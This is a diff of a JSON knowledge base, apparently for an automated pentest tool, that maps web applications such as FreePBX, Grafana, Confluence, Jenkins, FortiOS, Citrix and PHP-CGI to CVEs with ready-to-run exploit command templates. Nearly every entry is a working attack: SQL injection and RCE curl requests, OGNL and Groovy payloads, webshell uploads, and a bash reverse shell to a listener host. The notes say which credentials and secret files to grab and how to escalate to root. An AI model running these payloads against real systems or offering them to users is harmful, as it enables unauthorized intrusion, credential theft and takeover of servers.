@@ -1,158 +1,383 @@
 {
-  "_comment": "Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.",
-  "entries": [
-    {
-      "match": ["freepbx"],
-      "range": "",
-      "cve": "CVE-2025-57819",
-      "severity": "critical",
-      "name": "FreePBX endpoint unauthenticated SQLi -> RCE",
-      "exploit": "curl -s -G 'http://{TARGET}:{PORT}/admin/ajax.php' --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode \"brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -\"",
-      "note": "Unauth error-based SQLi in the endpoint module ajax handler (brand param); the module path bypasses the auth check. Stacked writes enabled -> INSERT a cron_jobs webshell dropper (echo <base64 php>|base64 -d >/var/www/html/shell.php) -> RCE as asterisk (~60s). Then incron: write /var/spool/asterisk/incron/api.fwconsole-commands.<base64(zlib(json[cmd,txn]))> -> the fwconsole-commands hook runs `fwconsole $cmd` as root -> command injection to root. Affects FreePBX 15/16/17 endpoint module. (HTB Connected.)"
-    },
-    {
-      "match": ["grafana"],
-      "range": ">=8.0.0,<8.3.1",
-      "cve": "CVE-2021-43798",
-      "severity": "high",
-      "name": "Grafana plugin path traversal (arbitrary file read)",
-      "exploit": "curl --path-as-is 'http://{TARGET}:{PORT}/public/plugins/alertlist/../../../../../../../../etc/passwd'",
-      "note": "Unauthenticated arbitrary file read. Grab /etc/passwd, then /etc/grafana/grafana.ini and /var/lib/grafana/grafana.db for admin hashes/data-source creds."
-    },
-    {
-      "match": ["gitlab"],
-      "range": ">=11.9,<13.10.3",
-      "cve": "CVE-2021-22205",
-      "severity": "critical",
-      "name": "GitLab unauthenticated RCE (ExifTool DjVu)",
-      "exploit": "# clone a public PoC (e.g. gitlab_exif RCE) and point it at the target\n# python3 gitlab_rce.py {TARGET} {PORT} 'bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'",
-      "note": "Pre-auth RCE via image upload -> ExifTool. Use a maintained PoC; register a throwaway account first if uploads need auth."
-    },
-    {
-      "match": ["confluence"],
-      "range": "",
-      "cve": "CVE-2022-26134",
-      "severity": "critical",
-      "name": "Atlassian Confluence OGNL injection RCE",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/' -D -",
-      "note": "Unauthenticated OGNL injection; command output returns in the X-Cmd response header. Verify the exact version-affected range before relying on it."
-    },
-    {
-      "match": ["jenkins"],
-      "range": ">=2.0,<2.442",
-      "cve": "CVE-2024-23897",
-      "severity": "high",
-      "name": "Jenkins CLI arbitrary file read",
-      "exploit": "java -jar jenkins-cli.jar -s http://{TARGET}:{PORT}/ -http connect-node @/etc/passwd",
-      "note": "Arbitrary file read via the CLI '@' arg expansion. Read /etc/passwd, then Jenkins secrets (secret.key, master.key, credentials.xml) to decrypt stored creds."
-    },
-    {
-      "match": ["joomla"],
-      "range": ">=4.0.0,<4.2.8",
-      "cve": "CVE-2023-23752",
-      "severity": "medium",
-      "name": "Joomla unauthenticated information disclosure",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/index.php/v1/config/application?public=true'",
-      "note": "Leaks the Joomla config including DB user/password over the REST API. Reuse the DB creds for SSH/CMS admin."
-    },
-    {
-      "match": ["drupal"],
-      "range": "",
-      "cve": "CVE-2018-7600",
-      "severity": "critical",
-      "name": "Drupalgeddon2 unauthenticated RCE",
-      "exploit": "# use a maintained drupalgeddon2 PoC against http://{TARGET}:{PORT}/\n# python3 drupalgeddon2.py http://{TARGET}:{PORT}/",
-      "note": "Pre-auth RCE via form-API render array (Drupal 7 <7.58 / 8 <8.5.1). Confirm the Drupal major version first."
-    },
-    {
-      "match": ["tomcat"],
-      "range": ">=9.0.0,<9.0.31",
-      "cve": "CVE-2020-1938",
-      "severity": "high",
-      "name": "Apache Tomcat AJP file read/inclusion (Ghostcat)",
-      "exploit": "# needs the AJP connector (usually 8009) reachable\n# python3 ghostcat.py -p 8009 {TARGET}  # read WEB-INF/web.xml, then chase deployable JSP for RCE",
-      "note": "AJP (8009) file read/inclusion; can become RCE if you can upload a JSP the app then includes."
-    },
-    {
-      "match": ["cacti"],
-      "range": ">=1.0.0,<1.2.23",
-      "cve": "CVE-2022-46169",
-      "severity": "critical",
-      "name": "Cacti unauthenticated command injection",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id'",
-      "note": "Unauth command injection via remote_agent.php (needs a guessable/allowed host). Swap ';id' for a reverse shell one-liner once confirmed."
-    },
-    {
-      "match": ["webmin"],
-      "range": ">=1.882,<1.930",
-      "cve": "CVE-2019-15107",
-      "severity": "critical",
-      "name": "Webmin password_change RCE",
-      "exploit": "# Metasploit: use exploit/linux/http/webmin_backdoor  (or a curl PoC against /password_change.cgi)\n# RHOSTS {TARGET}; RPORT {PORT}",
-      "note": "Unauthenticated RCE via the password_change.cgi backdoor when password expiry is enabled."
-    },
-    {
-      "match": ["metabase"],
-      "range": ">=0.0.0,<0.46.6.1",
-      "cve": "CVE-2023-38646",
-      "severity": "critical",
-      "name": "Metabase pre-auth RCE (setup-token JDBC)",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/session/properties' | grep -o 'setup-token[^,]*'   # then abuse /api/setup/validate with an H2 JDBC payload",
-      "note": "Leak the setup-token, then RCE via a crafted H2 JDBC connection string in /api/setup/validate."
-    },
-    {
-      "match": ["owncloud"],
-      "range": "",
-      "cve": "CVE-2023-49103",
-      "severity": "critical",
-      "name": "ownCloud graphapi phpinfo secret disclosure",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php'",
-      "note": "Leaks environment (incl. admin credentials / object-store keys) via a bundled phpinfo. Affects owncloud/graphapi 0.2.x-0.3.0."
-    },
-    {
-      "match": ["struts"],
-      "range": "",
-      "cve": "CVE-2017-5638",
-      "severity": "critical",
-      "name": "Apache Struts2 OGNL RCE (Content-Type)",
-      "exploit": "# use a maintained Struts2 (S2-045) PoC against http://{TARGET}:{PORT}/  -- injects OGNL via the Content-Type header",
-      "note": "Classic pre-auth RCE via a malicious Content-Type. Confirm a Struts2 action endpoint (.action/.do) first."
-    },
-    {
-      "match": ["phpmyadmin"],
-      "range": "",
-      "cve": "CVE-2018-12613",
-      "severity": "high",
-      "name": "phpMyAdmin LFI / SQL-shell to RCE",
-      "exploit": "# with valid DB creds, log in then: /index.php?target=db_sql.php%253f/../../../../etc/passwd  (LFI)\n# or write a webshell via SELECT ... INTO OUTFILE if FILE priv is granted",
-      "note": "phpMyAdmin 4.8.x LFI via the target param; combine with SQL SELECT INTO OUTFILE for a webshell once authenticated."
-    },
-    {
-      "match": ["nagios"],
-      "range": "",
-      "cve": "CVE-2019-15949",
-      "severity": "high",
-      "name": "Nagios XI authenticated RCE",
-      "exploit": "# authenticate, then Metasploit: use exploit/linux/http/nagios_xi_authenticated_rce  RHOSTS {TARGET}",
-      "note": "Post-auth RCE (default creds nagiosadmin often work). Enumerate the exact Nagios XI build to pick the right CVE."
-    },
-    {
-      "match": ["nginx ui"],
-      "range": "",
-      "cve": "CVE-2024-49368",
-      "severity": "critical",
-      "name": "Nginx UI (0xJacky) unauthenticated abuse",
-      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/settings'   # probe unauth API; check /api/backup and config test-run RCE paths",
-      "note": "0xJacky/nginx-ui manager exposes powerful config/test/run endpoints. Probe the API unauth (backup disclosure / config-run RCE); a known-vulnerable admin panel is a strong foothold."
-    },
-    {
-      "match": ["spring"],
-      "range": "",
-      "cve": "CVE-2022-22965",
-      "severity": "critical",
-      "name": "Spring4Shell RCE (data binding)",
-      "exploit": "# use a maintained Spring4Shell PoC against http://{TARGET}:{PORT}/  -- writes a JSP webshell via classloader data binding",
-      "note": "RCE on Spring MVC apps running on Tomcat with JDK9+. Confirm a data-binding endpoint; drops a JSP shell under the webroot."
-    }
-  ]
+ "_comment": "Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.",
+ "entries": [
+  {
+   "match": [
+    "freepbx"
+   ],
+   "range": "",
+   "cve": "CVE-2025-57819",
+   "severity": "critical",
+   "name": "FreePBX endpoint unauthenticated SQLi -> RCE",
+   "exploit": "curl -s -G 'http://{TARGET}:{PORT}/admin/ajax.php' --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode \"brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -\"",
+   "note": "Unauth error-based SQLi in the endpoint module ajax handler (brand param); the module path bypasses the auth check. Stacked writes enabled -> INSERT a cron_jobs webshell dropper (echo <base64 php>|base64 -d >/var/www/html/shell.php) -> RCE as asterisk (~60s). Then incron: write /var/spool/asterisk/incron/api.fwconsole-commands.<base64(zlib(json[cmd,txn]))> -> the fwconsole-commands hook runs `fwconsole $cmd` as root -> command injection to root. Affects FreePBX 15/16/17 endpoint module. (HTB Connected.)"
+  },
+  {
+   "match": [
+    "grafana"
+   ],
+   "range": ">=8.0.0,<8.3.1",
+   "cve": "CVE-2021-43798",
+   "severity": "high",
+   "name": "Grafana plugin path traversal (arbitrary file read)",
+   "exploit": "curl --path-as-is 'http://{TARGET}:{PORT}/public/plugins/alertlist/../../../../../../../../etc/passwd'",
+   "note": "Unauthenticated arbitrary file read. Grab /etc/passwd, then /etc/grafana/grafana.ini and /var/lib/grafana/grafana.db for admin hashes/data-source creds."
+  },
+  {
+   "match": [
+    "gitlab"
+   ],
+   "range": ">=11.9,<13.10.3",
+   "cve": "CVE-2021-22205",
+   "severity": "critical",
+   "name": "GitLab unauthenticated RCE (ExifTool DjVu)",
+   "exploit": "# clone a public PoC (e.g. gitlab_exif RCE) and point it at the target\n# python3 gitlab_rce.py {TARGET} {PORT} 'bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'",
+   "note": "Pre-auth RCE via image upload -> ExifTool. Use a maintained PoC; register a throwaway account first if uploads need auth."
+  },
+  {
+   "match": [
+    "confluence"
+   ],
+   "range": "",
+   "cve": "CVE-2022-26134",
+   "severity": "critical",
+   "name": "Atlassian Confluence OGNL injection RCE",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/' -D -",
+   "note": "Unauthenticated OGNL injection; command output returns in the X-Cmd response header. Verify the exact version-affected range before relying on it."
+  },
+  {
+   "match": [
+    "jenkins"
+   ],
+   "range": ">=2.0,<2.442",
+   "cve": "CVE-2024-23897",
+   "severity": "high",
+   "name": "Jenkins CLI arbitrary file read",
+   "exploit": "java -jar jenkins-cli.jar -s http://{TARGET}:{PORT}/ -http connect-node @/etc/passwd",
+   "note": "Arbitrary file read via the CLI '@' arg expansion. Read /etc/passwd, then Jenkins secrets (secret.key, master.key, credentials.xml) to decrypt stored creds."
+  },
+  {
+   "match": [
+    "joomla"
+   ],
+   "range": ">=4.0.0,<4.2.8",
+   "cve": "CVE-2023-23752",
+   "severity": "medium",
+   "name": "Joomla unauthenticated information disclosure",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/api/index.php/v1/config/application?public=true'",
+   "note": "Leaks the Joomla config including DB user/password over the REST API. Reuse the DB creds for SSH/CMS admin."
+  },
+  {
+   "match": [
+    "drupal"
+   ],
+   "range": "",
+   "cve": "CVE-2018-7600",
+   "severity": "critical",
+   "name": "Drupalgeddon2 unauthenticated RCE",
+   "exploit": "# use a maintained drupalgeddon2 PoC against http://{TARGET}:{PORT}/\n# python3 drupalgeddon2.py http://{TARGET}:{PORT}/",
+   "note": "Pre-auth RCE via form-API render array (Drupal 7 <7.58 / 8 <8.5.1). Confirm the Drupal major version first."
+  },
+  {
+   "match": [
+    "tomcat"
+   ],
+   "range": ">=9.0.0,<9.0.31",
+   "cve": "CVE-2020-1938",
+   "severity": "high",
+   "name": "Apache Tomcat AJP file read/inclusion (Ghostcat)",
+   "exploit": "# needs the AJP connector (usually 8009) reachable\n# python3 ghostcat.py -p 8009 {TARGET}  # read WEB-INF/web.xml, then chase deployable JSP for RCE",
+   "note": "AJP (8009) file read/inclusion; can become RCE if you can upload a JSP the app then includes."
+  },
+  {
+   "match": [
+    "cacti"
+   ],
+   "range": ">=1.0.0,<1.2.23",
+   "cve": "CVE-2022-46169",
+   "severity": "critical",
+   "name": "Cacti unauthenticated command injection",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id'",
+   "note": "Unauth command injection via remote_agent.php (needs a guessable/allowed host). Swap ';id' for a reverse shell one-liner once confirmed."
+  },
+  {
+   "match": [
+    "webmin"
+   ],
+   "range": ">=1.882,<1.930",
+   "cve": "CVE-2019-15107",
+   "severity": "critical",
+   "name": "Webmin password_change RCE",
+   "exploit": "# Metasploit: use exploit/linux/http/webmin_backdoor  (or a curl PoC against /password_change.cgi)\n# RHOSTS {TARGET}; RPORT {PORT}",
+   "note": "Unauthenticated RCE via the password_change.cgi backdoor when password expiry is enabled."
+  },
+  {
+   "match": [
+    "metabase"
+   ],
+   "range": ">=0.0.0,<0.46.6.1",
+   "cve": "CVE-2023-38646",
+   "severity": "critical",
+   "name": "Metabase pre-auth RCE (setup-token JDBC)",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/api/session/properties' | grep -o 'setup-token[^,]*'   # then abuse /api/setup/validate with an H2 JDBC payload",
+   "note": "Leak the setup-token, then RCE via a crafted H2 JDBC connection string in /api/setup/validate."
+  },
+  {
+   "match": [
+    "owncloud"
+   ],
+   "range": "",
+   "cve": "CVE-2023-49103",
+   "severity": "critical",
+   "name": "ownCloud graphapi phpinfo secret disclosure",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php'",
+   "note": "Leaks environment (incl. admin credentials / object-store keys) via a bundled phpinfo. Affects owncloud/graphapi 0.2.x-0.3.0."
+  },
+  {
+   "match": [
+    "struts"
+   ],
+   "range": "",
+   "cve": "CVE-2017-5638",
+   "severity": "critical",
+   "name": "Apache Struts2 OGNL RCE (Content-Type)",
+   "exploit": "# use a maintained Struts2 (S2-045) PoC against http://{TARGET}:{PORT}/  -- injects OGNL via the Content-Type header",
+   "note": "Classic pre-auth RCE via a malicious Content-Type. Confirm a Struts2 action endpoint (.action/.do) first."
+  },
+  {
+   "match": [
+    "phpmyadmin"
+   ],
+   "range": "",
+   "cve": "CVE-2018-12613",
+   "severity": "high",
+   "name": "phpMyAdmin LFI / SQL-shell to RCE",
+   "exploit": "# with valid DB creds, log in then: /index.php?target=db_sql.php%253f/../../../../etc/passwd  (LFI)\n# or write a webshell via SELECT ... INTO OUTFILE if FILE priv is granted",
+   "note": "phpMyAdmin 4.8.x LFI via the target param; combine with SQL SELECT INTO OUTFILE for a webshell once authenticated."
+  },
+  {
+   "match": [
+    "nagios"
+   ],
+   "range": "",
+   "cve": "CVE-2019-15949",
+   "severity": "high",
+   "name": "Nagios XI authenticated RCE",
+   "exploit": "# authenticate, then Metasploit: use exploit/linux/http/nagios_xi_authenticated_rce  RHOSTS {TARGET}",
+   "note": "Post-auth RCE (default creds nagiosadmin often work). Enumerate the exact Nagios XI build to pick the right CVE."
+  },
+  {
+   "match": [
+    "nginx ui"
+   ],
+   "range": "",
+   "cve": "CVE-2024-49368",
+   "severity": "critical",
+   "name": "Nginx UI (0xJacky) unauthenticated abuse",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/api/settings'   # probe unauth API; check /api/backup and config test-run RCE paths",
+   "note": "0xJacky/nginx-ui manager exposes powerful config/test/run endpoints. Probe the API unauth (backup disclosure / config-run RCE); a known-vulnerable admin panel is a strong foothold."
+  },
+  {
+   "match": [
+    "spring"
+   ],
+   "range": "",
+   "cve": "CVE-2022-22965",
+   "severity": "critical",
+   "name": "Spring4Shell RCE (data binding)",
+   "exploit": "# use a maintained Spring4Shell PoC against http://{TARGET}:{PORT}/  -- writes a JSP webshell via classloader data binding",
+   "note": "RCE on Spring MVC apps running on Tomcat with JDK9+. Confirm a data-binding endpoint; drops a JSP shell under the webroot."
+  },
+  {
+   "match": [
+    "moodle"
+   ],
+   "range": "",
+   "cve": "CVE-2024-1440",
+   "severity": "high",
+   "name": "Moodle SSRF/RCE lead",
+   "exploit": "searchsploit moodle; # authenticated: calculated question / SCORM -> RCE; check version at /admin/environment.php",
+   "note": "Fingerprint Moodle version at /admin/environment.php or lib/upgrade.txt. Common paths: teacher-role calculated-question RCE, SCORM package upload. Enumerate plugins."
+  },
+  {
+   "match": [
+    "pfsense"
+   ],
+   "range": "",
+   "cve": "CVE-2023-27253",
+   "severity": "high",
+   "name": "pfSense authenticated diag_command RCE",
+   "exploit": "# auth as admin -> /diag_command.php executes shell; or restore_config XSS; metasploit unix/http/pfsense_diag_command_exec",
+   "note": "pfSense webConfigurator. With admin creds, diag_command.php gives RCE. Default admin/pfsense. Check version at footer."
+  },
+  {
+   "match": [
+    "fortinet",
+    "fortios"
+   ],
+   "range": "",
+   "cve": "CVE-2024-21762",
+   "severity": "critical",
+   "name": "FortiOS SSL-VPN out-of-bound RCE / auth bypass",
+   "exploit": "# CVE-2022-40684 auth-bypass: PUT /api/v2/cmdb/system/admin/<user> with Forwarded header + User-Agent 'Node.js'; CVE-2024-21762 pre-auth RCE",
+   "note": "Fortigate SSL-VPN. 40684 = admin add via crafted headers; 21762 = pre-auth heap overflow RCE. Fingerprint via /remote/login."
+  },
+  {
+   "match": [
+    "glpi"
+   ],
+   "range": "",
+   "cve": "CVE-2022-35914",
+   "severity": "critical",
+   "name": "GLPI htmLawed pre-auth RCE",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/vendor/htmlawed/htmlawed/htmLawedTest.php' --data 'sid=x&hhook=system&text=id'",
+   "note": "htmLawedTest.php calls the hhook function on text -> RCE. Unauth. Also CVE-2022-35947 SQLi. Version at /status.php."
+  },
+  {
+   "match": [
+    "roundcube"
+   ],
+   "range": "",
+   "cve": "CVE-2024-42009",
+   "severity": "high",
+   "name": "Roundcube stored XSS / desanitization",
+   "exploit": "# XSS via crafted email -> steal session/creds; older CVE-2020-35730 SSRF. Check version in /program/js or CHANGELOG",
+   "note": "Webmail XSS chains to account takeover. Combine with SMTP/IMAP creds. Look for enabled plugins (elastic, larry)."
+  },
+  {
+   "match": [
+    "zabbix"
+   ],
+   "range": "",
+   "cve": "CVE-2024-42327",
+   "severity": "critical",
+   "name": "Zabbix SQLi (non-admin API)",
+   "exploit": "# user.get / CControllerHost SQLi via API; older CVE-2022-23131 SAML SSO auth bypass (zbx_session cookie)",
+   "note": "Zabbix frontend. 23131 = unauth via forged zbx_session when SAML on. 42327 = authenticated SQLi. Default Admin/zabbix."
+  },
+  {
+   "match": [
+    "zimbra"
+   ],
+   "range": "",
+   "cve": "CVE-2022-27925",
+   "severity": "critical",
+   "name": "Zimbra mboximport unauth RCE (+ CVE-2022-37042)",
+   "exploit": "# POST /service/extension/backup/mboximport?account-name=admin zip path-traversal webshell into jsp; CVE-2022-41352 = amavis cpio",
+   "note": "Zimbra Collaboration. mboximport writes a JSP webshell. 41352 uses cpio to write to webroot. Check /zm build version."
+  },
+  {
+   "match": [
+    "ofbiz"
+   ],
+   "range": "",
+   "cve": "CVE-2023-51467",
+   "severity": "critical",
+   "name": "Apache OFBiz auth bypass -> RCE (+ CVE-2023-49070)",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y' --data-urlencode 'groovyProgram=throw new Exception(\"id\".execute().text)'",
+   "note": "requirePasswordChange=Y bypasses auth; ProgramExport runs Groovy -> RCE. 49070 = XML-RPC deser. Screen-render SSTI variant too."
+  },
+  {
+   "match": [
+    "wso2"
+   ],
+   "range": "",
+   "cve": "CVE-2022-29464",
+   "severity": "critical",
+   "name": "WSO2 arbitrary file upload -> RCE",
+   "exploit": "curl -k -s 'https://{TARGET}:{PORT}/fileupload/toolsAny' -F 'x=@shell.jsp;filename=../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp'",
+   "note": "Unauth JSP upload via path traversal in fileupload endpoint. Then hit /authenticationendpoint/shell.jsp. Affects Identity Server/API Manager."
+  },
+  {
+   "match": [
+    "coldfusion"
+   ],
+   "range": "",
+   "cve": "CVE-2023-26360",
+   "severity": "critical",
+   "name": "Adobe ColdFusion deserialization RCE",
+   "exploit": "# POST to /CFIDE/adminapi/... or a .cfc with crafted arguments deserialization; also CVE-2023-29300 WDDX",
+   "note": "Pre-auth deserialization -> RCE / arbitrary read. Check /CFIDE/administrator/. Combine with LFI to read admin hash."
+  },
+  {
+   "match": [
+    "citrix"
+   ],
+   "range": "",
+   "cve": "CVE-2023-3519",
+   "severity": "critical",
+   "name": "Citrix NetScaler ADC/Gateway pre-auth RCE",
+   "exploit": "# CVE-2023-3519 memory overflow in /nCC or SAML; CVE-2019-19781 path traversal /vpn/../vpns/cfg/smb.conf -> perl template RCE",
+   "note": "Citrix ADC/Gateway. 19781 (Shitrix) writes an XML template that runs perl. 3519 pre-auth RCE. Fingerprint /vpn/index.html."
+  },
+  {
+   "match": [
+    "teamcity"
+   ],
+   "range": "",
+   "cve": "CVE-2023-42793",
+   "severity": "critical",
+   "name": "JetBrains TeamCity auth bypass -> RCE",
+   "exploit": "curl -s -X POST 'http://{TARGET}:{PORT}/app/rest/users/id:1/tokens/x' ; # then use token to enable debug/process runner -> RCE",
+   "note": "Unauth token creation for admin (id:1) via REST -> create a build step that runs commands. Pre-2023.05.4."
+  },
+  {
+   "match": [
+    "laravel"
+   ],
+   "range": "",
+   "cve": "CVE-2021-3129",
+   "severity": "critical",
+   "name": "Laravel Ignition debug-mode RCE",
+   "exploit": "# php artisan / Ignition: POST /_ignition/execute-solution with MakeViewVariableOptionalSolution -> log-poison phar/monolog RCE (use laravel-ignition-rce / phpggc)",
+   "note": "APP_DEBUG=true exposes Ignition. Chain via monolog/phpggc gadget. Also grab .env (DB creds, APP_KEY) for deserialization."
+  },
+  {
+   "match": [
+    "magento"
+   ],
+   "range": "",
+   "cve": "CVE-2022-24086",
+   "severity": "critical",
+   "name": "Magento template injection pre-auth RCE",
+   "exploit": "# checkout comment SSTI: {{invokable ...}} in a placed-order comment -> RCE; TrojanOrder",
+   "note": "Magento/Adobe Commerce mail template injection during checkout. Combine with a placed order. Grab app/etc/env.php."
+  },
+  {
+   "match": [
+    "craftcms",
+    "craft cms"
+   ],
+   "range": "",
+   "cve": "CVE-2023-41892",
+   "severity": "critical",
+   "name": "Craft CMS pre-auth RCE",
+   "exploit": "# POST /index.php?p=admin/actions/conditions/render-... Yii conditionBuilder -> RCE via GuzzleHttp phar/imagick",
+   "note": "Unauth Yii object instantiation -> RCE. Check version at /admin. Combine with .env grab."
+  },
+  {
+   "match": [
+    "apache",
+    "2.4.49"
+   ],
+   "range": "",
+   "cve": "CVE-2021-41773",
+   "severity": "high",
+   "name": "Apache 2.4.49/2.4.50 path traversal + RCE",
+   "exploit": "curl -s --path-as-is 'http://{TARGET}:{PORT}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'",
+   "note": "Only 2.4.49/2.4.50 with require-all-granted or mod_cgi. Read files via /icons/.%2e/... ; RCE only if cgi enabled."
+  },
+  {
+   "match": [
+    "php",
+    "8.1"
+   ],
+   "range": "",
+   "cve": "CVE-2024-4577",
+   "severity": "critical",
+   "name": "PHP-CGI argument injection RCE (Windows)",
+   "exploit": "curl -s 'http://{TARGET}:{PORT}/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input' --data '<?php system(\"whoami\"); ?>'",
+   "note": "Windows PHP-CGI (XAMPP) soft-hyphen 0xAD argument injection -> arbitrary PHP. Only Windows/CGI SAPI."
+  }
+ ]
 }
